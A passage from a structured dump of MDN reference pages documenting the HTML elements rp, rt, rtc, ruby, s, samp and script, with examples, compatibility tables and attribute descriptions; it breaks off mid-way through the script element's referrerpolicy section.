browser does not support ruby annotations, the result looks like this instead:\n\n## Technical summary\n\n|                                             |                                                                                                                                                                       |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                                 |\n| Permitted content                           | Text                                                                                                                                                                  |\n| Tag omission                                | The end tag can be omitted if the element is immediately followed by an [`<rt>`](rt) or another `<rp>` element, or if there is no more content in the parent element. |\n| Permitted parents                           | A [`<ruby>`](ruby) element. `<rp>` must be positioned immediately before or after an [`<rt>`](rt) element.                                                            |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                   |\n| Permitted ARIA roles                        | Any                                                                                                                                                                   |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|      | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|      | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `rp` | 5       | 12   | 38      | 15    | 5      | 18             | 38                  | 14            | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<ruby>`](ruby)\n- [`<rt>`](rt)\n- [`<rb>`](rb)\n- [`<rtc>`](rtc)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/rp](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/rp)"
- name: rt
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<rt\\>: The Ruby Text element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Frt&level=high)\n\nThe `<rt>` [HTML](../index) element specifies the ruby text component of a ruby annotation, which is used to provide pronunciation, translation, or transliteration information for East Asian typography. The `<rt>` element must always be contained within a [`<ruby>`](ruby) element.\n\n## Try it\n\n#### HTML Demo: \\<rt\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <ruby> 漢 <rp>(</rp><rt>kan</rt><rp>)</rp> 字 <rp>(</rp><rt>ji</rt><rp>)</rp> </ruby>\n\n    ruby {\n      font-size: 2em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\nSee the article about the [`<ruby>`](ruby) element for more examples.\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\n### Using ruby annotations\n\nThis simple example provides Romaji transliteration for the kanji characters within the [`<ruby>`](ruby) element:\n\nhtml\n\n```\n<ruby> 漢 <rt>Kan</rt> 字 <rt>ji</rt> </ruby>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                     |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                               |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                         |\n| Tag omission                                | The end tag may be omitted if the `<rt>` element is immediately followed by an `<rt>` or [`<rp>`](rp) element, or if there is no more content in the parent element |\n| Permitted parents                           | A [`<ruby>`](ruby) element.                                                                                                                                         |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                 |\n| Permitted ARIA roles                        | Any                                                                                                                                                                 |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                                       |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|      | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|      | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `rt` | 5       | 12   | 38      | 15    | 5      | 18             | 38                  | 14            | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<ruby>`](ruby)\n- [`<rp>`](rp)\n- [`<rb>`](rb)\n- [`<rtc>`](rtc)\n- [`text-transform: full-size-kana`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-transform)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/rt](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/rt)"
- name: rtc
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<rtc\\>: The Ruby Text Container element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<rtc>` [HTML](../index) element embraces semantic annotations of characters presented in a ruby of [`<rb>`](rb) elements used inside of [`<ruby>`](ruby) element. [`<rb>`](rb) elements can have both pronunciation ([`<rt>`](rt)) and semantic (`<rtc>`) annotations.\n\n## Try it\n\n#### HTML Demo: \\<rtc\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <ruby xml:lang=\"zh-Hant\" style=\"ruby-position: under;\">\n        <rbc>\n            <rb>馬</rb><rp>(</rp><rt>mǎ</rt><rp>)</rp>\n            <rb>來</rb><rp>(</rp><rt>lái</rt><rp>)</rp>\n            <rb>西</rb><rp>(</rp><rt>xī</rt><rp>)</rp>\n            <rb>亞</rb><rp>(</rp><rt>yà</rt><rp>)</rp>\n        </rbc>\n        <rtc xml:lang=\"en\" style=\"ruby-position: over;\">\n            <rp>(</rp><rt>Malaysia</rt><rp>)</rp>\n        </rtc>\n    </ruby>\n\n    ruby {\n      font-size: 2em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\nhtml\n\n```\n<div class=\"info\">\n  <ruby>\n    <rtc>\n      <rb>旧</rb><rt>jiù</rt>\n      <rb>金</rb><rt>jīn</rt>\n      <rb>山</rb><rt>shān</rt>\n    </rtc>\n    <rtc>San Francisco</rtc>\n  </ruby>\n</div>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                           |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                     |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content) or [`<rt>`](rt) elements.                                                                      |\n| Tag omission                                | The closing tag can be omitted if it is immediately followed by a [`<rb>`](rb), `<rtc>` or [`<rt>`](rt) element opening tag or by its parent closing tag. |\n| Permitted parents                           | A [`<ruby>`](ruby) element.                                                                                                                               |\n| Permitted ARIA roles                        | Any                                                                                                                                                       |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                                             |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|       | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|       | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `rtc` | ≤80     | 80   | 33      | 67    | ≤13.1  | 80             | 33                  | 57            | ≤13.4         | 13.0             | 80              |     |\n\n## See also\n\n- [`<ruby>`](ruby)\n- [`<rp>`](rp)\n- [`<rb>`](rb)\n- [`<rt>`](rt)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/rtc](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/rtc)"
- name: ruby
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<ruby\\>: The Ruby Annotation element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fruby&level=high)\n\nThe `<ruby>` [HTML](../index) element represents small annotations that are rendered above, below, or next to base text, usually used for showing the pronunciation of East Asian characters. It can also be used for annotating other kinds of text, but this usage is less common.\n\nThe term *ruby* originated as [a unit of measurement used by typesetters](https://en.wikipedia.org/wiki/Agate_(typography)), representing the smallest size that text can be printed on newsprint while remaining legible.\n\n## Try it\n\n#### HTML Demo: \\<ruby\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <ruby> 明日 <rp>(</rp><rt>Ashita</rt><rp>)</rp> </ruby>\n\n    ruby {\n      font-size: 2em;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\n### Example 1: Character\n\nhtml\n\n```\n<ruby>\n  漢 <rp>(</rp><rt>Kan</rt><rp>)</rp> 字 <rp>(</rp><rt>ji</rt><rp>)</rp>\n</ruby>\n```\n\n#### Result\n\n### Example 2: Word\n\nhtml\n\n```\n<ruby> 明日 <rp>(</rp><rt>Ashita</rt><rp>)</rp> </ruby>\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                               |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `ruby` | 5       | 12   | 38      | 15    | 5      | 18             | 38                  | 14            | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<rt>`](rt)\n- [`<rp>`](rp)\n- [`<rb>`](rb)\n- [`<rtc>`](rtc)\n- [`text-transform`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-transform): full-size-kana\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/ruby](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/ruby)"
- name: s
  summary: The <s> HTML element renders text with a strikethrough, or a line through it
  description: "# \\<s\\>: The Strikethrough element\n\nThe `<s>` [HTML](../index) element renders text with a strikethrough, or a line through it. Use the `<s>` element to represent things that are no longer relevant or no longer accurate. However, `<s>` is not appropriate when indicating document edits; for that, use the [`<del>`](del) and [`<ins>`](ins) elements, as appropriate.\n\n## Try it\n\n#### HTML Demo: \\<s\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p><s>There will be a few tickets available at the box office tonight.</s></p>\n\n    <p>SOLD OUT!</p>\n\n    /* stylelint-disable-next-line block-no-empty */\n    s {\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Accessibility\n\nThe presence of the `s` element is not announced by most screen reading technology in its default configuration. It can be made to be announced by using the CSS [`content`](https://developer.mozilla.org/en-US/docs/Web/CSS/content) property, along with the [`::before`](https://developer.mozilla.org/en-US/docs/Web/CSS/::before) and [`::after`](https://developer.mozilla.org/en-US/docs/Web/CSS/::after) pseudo-elements.\n\ncss\n\n```\ns::before,\ns::after {\n  clip-path: inset(100%);\n  clip: rect(1px, 1px, 1px, 1px);\n  height: 1px;\n  overflow: hidden;\n  position: absolute;\n  white-space: nowrap;\n  width: 1px;\n}\n\ns::before {\n  content: \" [start of stricken text] \";\n}\n\ns::after {\n  content: \" [end of stricken text] \";\n}\n```\n\nSome people who use screen readers deliberately disable announcing content that creates extra verbosity. Because of this, it is important to not abuse this technique and only apply it in situations where not knowing content has been struck out would adversely affect understanding.\n\n- [Short note on making your mark (more accessible) \\| The Paciello Group](https://www.tpgi.com/short-note-on-making-your-mark-more-accessible/)\n- [Tweaking Text Level Styles \\| Adrian Roselli](https://adrianroselli.com/2017/12/tweaking-text-level-styles.html)\n\n## Examples\n\ncss\n\n```\n.sold-out {\n  text-decoration: line-through;\n}\n```\n\nhtml\n\n```\n<s>Today's Special: Salmon</s> SOLD OUT<br />\n<span class=\"sold-out\">Today's Special: Salmon</span> SOLD OUT\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                             |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Phrasing content](../content_categories#phrasing_content), [flow content](../content_categories#flow_content).                             |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                 |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                       |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                        |\n| Implicit ARIA role                          | [`deletion`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents) |\n| Permitted ARIA roles                        | Any                                                                                                                                         |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                               |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- The [`<strike>`](strike) element, alter ego of the `<s>` element, is obsolete and should not be used on websites anymore.\n- The [`<del>`](del) element is to be used instead if the data has been *deleted*.\n- The CSS [`text-decoration-line`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration-line) property is to be used to achieve the former visual aspect of the `<s>` element.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/s](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/s)"
- name: samp
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<samp\\>: The Sample Output element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fsamp&level=high)\n\nThe `<samp>` [HTML](../index) element is used to enclose inline text which represents sample (or quoted) output from a computer program. Its contents are typically rendered using the browser's default monospaced font (such as [Courier](https://en.wikipedia.org/wiki/Courier_(typeface)) or Lucida Console).\n\n## Try it\n\n#### HTML Demo: \\<samp\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>I was trying to boot my computer, but I got this hilarious message:</p>\n\n    <p>\n      <samp>Keyboard not found <br />Press F1 to continue</samp>\n    </p>\n\n    samp {\n      font-weight: bold;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nYou can use a CSS rule to override the browser's default font face for the `<samp>` element; however, it's possible that the browser's preferences may take precedence over any CSS you specify.\n\nThe CSS to override the default font face would look like this:\n\ncss\n\n```\nsamp {\n  font-family: \"Courier\";\n}\n```\n\n**Note:** If you need an element which will serve as a container for output generated by your website or app's JavaScript code, you should instead use the [`<output>`](output) element.\n\n## Examples\n\n### Basic example\n\nIn this simple example, a paragraph includes an example of the output of a program.\n\nhtml\n\n```\n<p>\n  When the process is complete, the utility will output the text\n  <samp>Scan complete. Found <em>N</em> results.</samp> You can then proceed to\n  the next step.\n</p>\n```\n\n#### Result\n\n### Sample output including user input\n\nYou can nest the [`<kbd>`](kbd) element within a `<samp>` block to present an example that includes text entered by the user. For example, consider this text presenting a transcript of a Linux (or macOS) console session:\n\n#### HTML\n\nhtml\n\n```\n<pre>\n<samp><span class=\"prompt\">mike@interwebz:~$</span> <kbd>md5 -s \"Hello world\"</kbd>\nMD5 (\"Hello world\") = 3e25960a79dbc69b674cd4ec67a72c62\n\n<span class=\"prompt\">mike@interwebz:~$</span> <span class=\"cursor\">█</span></samp></pre>\n```\n\nNote the use of [`<span>`](span) to allow customization of the appearance of specific portions of the sample text such as the shell prompts and the cursor. Note also the use of `<kbd>` to represent the command the user entered at the prompt in the sample text.\n\n#### CSS\n\nThe CSS that achieves the appearance we want is:\n\ncss\n\n```\n.prompt {\n  color: #b00;\n}\n\nsamp > kbd {\n  font-weight: bold;\n}\n\n.cursor {\n  color: #00b;\n}\n```\n\nThis gives the prompt and cursor fairly subtle colorization and emboldens the keyboard input within the sample text.\n\n#### Result\n\nThe resulting output is this:\n\n## Technical summary\n\n|                                             |                                                                                                                                   |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content. |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                       |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                             |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                              |\n| Implicit ARIA role                          | [`generic`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/generic_role)                                   |\n| Permitted ARIA roles                        | Any                                                                                                                               |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement)                                                     |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `samp` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- Related elements: [`<kbd>`](kbd), [`<code>`](code), [`<pre>`](pre)\n- The [`<output>`](output) element: a container for script-generated output\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/samp](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/samp)"
- name: sandbox (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`sandbox`](element/iframe#sandbox)

    [`<iframe>`](element/iframe)

    Stops a document loaded in an iframe from using certain features (such as submitting forms or opening new windows).
- name: scope (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`scope`](element/th#scope)

    [`<th>`](element/th)

    Defines the cells that the header test (defined in the `th` element) relates to.
- name: scoped (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`scoped`](element/style#scoped) Non-standard Deprecated

    [`<style>`](element/style)
- name: script
  summary: The <script> HTML element is used to embed executable code or data; this is typically used to embed or refer to JavaScript code
  description: "# \\<script\\>: The Script element\n\nThe `<script>` [HTML](../index) element is used to embed executable code or data; this is typically used to embed or refer to JavaScript code. The `<script>` element can also be used with other languages, such as [WebGL](https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API)'s GLSL shader programming language and [JSON](https://developer.mozilla.org/en-US/docs/Glossary/JSON).\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`async`](#async)  \nFor classic scripts, if the `async` attribute is present, then the classic script will be fetched in parallel to parsing and evaluated as soon as it is available.\n\nFor [module scripts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules), if the `async` attribute is present then the scripts and all their dependencies will be fetched in parallel to parsing and evaluated as soon as they are available.\n\n**Warning:** This attribute must not be used if the `src` attribute is absent (i.e. for inline scripts) for classic scripts, in this case it would have no effect.\n\nThis attribute allows the elimination of **parser-blocking JavaScript** where the browser would have to load and evaluate scripts before continuing to parse. `defer` has a similar effect in this case.\n\nIf the attribute is specified with the `defer` attribute, the element will act as if only the `async` attribute is specified.\n\nThis is a boolean attribute: the presence of a boolean attribute on an element represents the true value, and the absence of the attribute represents the false value.\n\nSee [Browser compatibility](#browser_compatibility) for notes on browser support. See also [Async scripts for asm.js](https://developer.mozilla.org/en-US/docs/Games/Techniques/Async_scripts).\n\n[`attributionsrc`](#attributionsrc) Experimental  \nSpecifies that you want the browser to send an [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header along with the script resource request. On the server-side this is used to trigger sending an [`Attribution-Reporting-Register-Source`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Source) or [`Attribution-Reporting-Register-Trigger`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Trigger) header in the response, to register a JavaScript-based [attribution source](https://developer.mozilla.org/en-US/docs/Web/API/Attribution_Reporting_API/Registering_sources#javascript-based_event_sources) or [attribution trigger](https://developer.mozilla.org/en-US/docs/Web/API/Attribution_Reporting_API/Registering_triggers#javascript-based_attribution_triggers), respectively. Which response header should be sent back depends on the value of the `Attribution-Reporting-Eligible` header that triggered the registration.\n\n**Note:** Alternatively, JavaScript-based attribution sources or triggers can be registered by sending a [`fetch()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/fetch) request containing the `attributionReporting` option (either set directly on the `fetch()` call or on a [`Request`](https://developer.mozilla.org/en-US/docs/Web/API/Request) object passed into the `fetch()` call), or by sending an [`XMLHttpRequest`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) with [`setAttributionReporting()`](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setAttributionReporting) invoked on the request object.\n\nThere are two versions of this attribute that you can set:\n\n- Boolean, i.e. just the `attributionsrc` name. This specifies that you want the [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header sent to the same server as the `src` attribute points to. This is fine when you are handling the attribution source or trigger registration on the same server. When registering an attribution trigger this property is optional, and an empty string value will be used if it is omitted.\n- Value containing one or more URLs, for example:\n  html\n\n  ```\n  <script\n    src=\"myscript.js\"\n    attributionsrc=\"https://a.example/register-source https://b.example/register-source\"></script>\n  ```\n\n  This is useful in cases where the requested resource is not on a server you control, or you just want to handle registering the attribution source on a different server. In this case, you can specify one or more URLs as the value of `attributionsrc`. When the resource request occurs the [`Attribution-Reporting-Eligible`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Eligible) header will be sent to the URL(s) specified in `attributionSrc` in addition to the resource origin. These URLs can then respond with a [`Attribution-Reporting-Register-Source`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Source) or [`Attribution-Reporting-Register-Trigger`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Attribution-Reporting-Register-Trigger) header as appropriate to complete registration.\n  **Note:** Specifying multiple URLs means that multiple attribution sources can be registered on the same feature. You might for example have different campaigns that you are trying to measure the success of, which involve generating different reports on different data.\n\nSee the [Attribution Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Attribution_Reporting_API) for more details.\n\n[`blocking`](#blocking) Experimental  \nThis attribute explicitly indicates that certain operations should be blocked on the fetching of the script. The operations that are to be blocked must be a space-separated list of blocking tokens listed below.\n\n- `render`: The rendering of content on the screen is blocked.\n\n[`crossorigin`](../attributes/crossorigin)  \nNormal `script` elements pass minimal information to the [`window.onerror`](https://developer.mozilla.org/en-US/docs/Web/API/Window/error_event) for scripts which do not pass the standard [CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS) checks. To allow error logging for sites which use a separate domain for static media, use this attribute. See [CORS settings attributes](../attributes/crossorigin) for a more descriptive explanation of its valid arguments.\n\n[`defer`](#defer)  \nThis Boolean attribute is set to indicate to a browser that the script is meant to be executed after the document has been parsed, but before firing [`DOMContentLoaded`](https://developer.mozilla.org/en-US/docs/Web/API/Document/DOMContentLoaded_event) event.\n\nScripts with the `defer` attribute will prevent the `DOMContentLoaded` event from firing until the script has loaded and finished evaluating.\n\n**Warning:** This attribute must not be used if the `src` attribute is absent (i.e. for inline scripts), in this case it would have no effect.\n\nThe `defer` attribute has no effect on [module scripts](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules) — they defer by default.\n\nScripts with the `defer` attribute will execute in the order in which they appear in the document.\n\nThis attribute allows the elimination of **parser-blocking JavaScript** where the browser would have to load and evaluate scripts before continuing to parse. `async` has a similar effect in this case.\n\nIf the attribute is specified with the `async` attribute, the element will act as if only the `async` attribute is specified.\n\n[`fetchpriority`](#fetchpriority)  \nProvides a hint of the relative priority to use when fetching an external script. Allowed values:\n\n[`high`](#high)  \nSignals a high-priority fetch relative to other external scripts.\n\n[`low`](#low)  \nSignals a low-priority fetch relative to other external scripts.\n\n[`auto`](#auto)  \nDefault: Signals automatic determination of fetch priority relative to other external scripts.\n\n[`integrity`](#integrity)  \nThis attribute contains inline metadata that a user agent can use to verify that a fetched resource has been delivered without unexpected manipulation. The attribute must not specified when the `src` attribute is not specified. See [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity).\n\n[`nomodule`](#nomodule)  \nThis Boolean attribute is set to indicate that the script should not be executed in browsers that support [ES modules](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules) — in effect, this can be used to serve fallback scripts to older browsers that do not support modular JavaScript code.\n\n[`nonce`](#nonce)  \nA cryptographic nonce (number used once) to allow scripts in a [script-src Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src). The server must generate a unique nonce value each time it transmits a policy. It is critical to provide a nonce that cannot be guessed as bypassing a resource's policy is otherwise trivial.\n\n[`referrerpolicy`](#referrerpolicy)  \nIndicates which [referrer](https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer) to send when fetching the script, or resources fetched by the script:\n\n- `no-referrer`: The [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent.\n- `no-referrer-when-downgrade`: The [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header will not be sent to [origin](https://developer.mozilla.org/en-US/docs/Glossary/Origin)s without [TLS](https://developer.mozilla.org/en-US/docs/Glossary/TLS) ([HTTPS](https://developer.mozilla.org/en-US/docs/Glossary/HTTPS)).\n- `origin`: The sent referrer will be limited to the origin of the referring page: its [scheme](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL), [host](https://developer.mozilla.org/en-US/docs/Glossary/Host), and [port](https://developer.mozilla.org/en-US/docs/Glossary/Port).\n- `origin-when-cross-origin`: The referrer sent to other origins will be limited to the scheme, the host, and the port. Navigations on the same origin will still include the path.\n- `same-origin`: A referrer will be sent for [same origin](https://developer.mozilla.org/en-US/docs/Glossary/Same-origin_policy), but cross-origin requests will contain no referrer information.\n- `strict-origin`: Only send the origin of the document as the referrer when the protocol security level stays the same (HTTPS→HTTPS), but don't send it to a less secure destination (HTTPS→HTTP).\n- `strict-origin-when-cross-origin` (default): Send a full URL when performing a same-origin request, only send the origin when the protocol security level stays the same (HTTPS→HTTPS), and send no header to a less secure destination (HTTPS→HTTP).\n- `unsafe-url`: The referrer will include the origin *and* the path (but not the [fragment](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/hash), [password](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/password), or [username](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement/username)). **This value is unsafe**, because it leaks origins and paths from TLS-protected resources to insecure origins.\n\n**Note:** An empty string value (`\"\"`) is both the 